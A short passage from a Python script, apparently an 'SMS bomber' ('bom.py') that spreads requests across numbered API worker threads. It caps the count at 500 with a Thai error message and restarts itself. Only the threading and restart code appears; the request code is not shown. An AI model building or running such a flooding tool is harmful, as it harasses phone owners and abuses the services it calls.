		threading.Thread(target=api52).start()
		
else:
	print("\033[1;91m จำนวนไม่เกิน500ค่ะ") # จำนวนไม่เกิน500 กำหนดตรง if ใส่501คือใส่จำนวนเกิน500ไม่ได้
	time.sleep(1)
	os.system("python bom.py") # ใส่ชื่อไฟล์ของเราเพื่อให้มันเริ่มใหม่